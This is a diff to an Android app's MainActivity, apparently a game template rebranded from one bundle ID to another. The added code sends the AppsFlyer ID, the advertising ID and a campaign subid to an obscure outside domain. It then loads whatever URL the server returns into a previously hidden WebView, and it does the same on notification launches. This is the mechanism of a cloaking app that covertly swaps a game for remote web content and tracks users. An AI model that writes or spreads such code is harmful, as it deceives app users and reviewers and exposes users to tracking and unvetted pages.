@@ -191,16 +191,43 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun manageUILogic(subId1: String, advertisingId: String = gaid) {
+        val appsflyerUserId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
         val isFirstRun = sharedPreferences.getBoolean("isFirstRun", true)
-
-        if(isFirstRun) {
-//            val subId1 = sharedPreferences.getString("conversion_data", null) ?: ""
-            val appsflyerUserId = AppsFlyerLib.getInstance().getAppsFlyerUID(this)
+        val isFromNotification: Boolean =
+            intent.extras?.getBoolean("is_from_notification", false) ?: false
+        if (isFromNotification) {
+            val url = sharedPreferences.getString(WEB_VEW_URL, "")
+            if (url.isNullOrEmpty()) {
+                if (subId1.isNotEmpty() && subId1 != "null") {
+                    val queue = Volley.newRequestQueue(this)
+                    val stringRequest = StringRequest(
+                        Request.Method.GET,
+                        "https://yhuqaaetu.vn.ua//click?ecid=&bundle_id=com.sibertas.egyptpower&subid1=$subId1&appsflyer_id=$appsflyerUserId&advertising_id=$advertisingId",
+                        { response ->
+                            // Display the first 500 characters of the response string.
+                            Log.d("STRING_RESPONSE", response)
+                            if (response.isNotEmpty()) {
+                                sharedPrefEditor?.putString(WEB_VEW_URL, response)?.commit()
+                                webView?.visibility = View.VISIBLE
+                                webView?.loadUrl(response)
+                            }
+                            sharedPrefEditor?.putBoolean("isFirstRun", false)?.commit()
+                        },
+                        { })
+                    queue.add(stringRequest)
+                }
+            } else {
+                webView?.visibility = View.VISIBLE
+                webView?.loadUrl(url)
+            }
+            return
+        }
+        if (isFirstRun) {
             if (subId1.isNotEmpty() && subId1 != "null") {
                 val queue = Volley.newRequestQueue(this)
                 val stringRequest = StringRequest(
                     Request.Method.GET,
-                    "https://http://inoperin.es/click?ecid=&bundle_id=com.hobedanedaam.galactic_wars&subid1=$subId1&appsflyer_id=$appsflyerUserId&advertising_id=$advertisingId",
+                    "https://yhuqaaetu.vn.ua//click?ecid=&bundle_id=com.sibertas.egyptpower&subid1=$subId1&appsflyer_id=$appsflyerUserId&advertising_id=$advertisingId",
                     { response ->
                         // Display the first 500 characters of the response string.
                         Log.d("STRING_RESPONSE", response)
@@ -224,7 +251,6 @@ class MainActivity : AppCompatActivity() {
             }
         }
     }
-
     private fun initViews() {
         webView = findViewById(R.id.web_view)
         CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
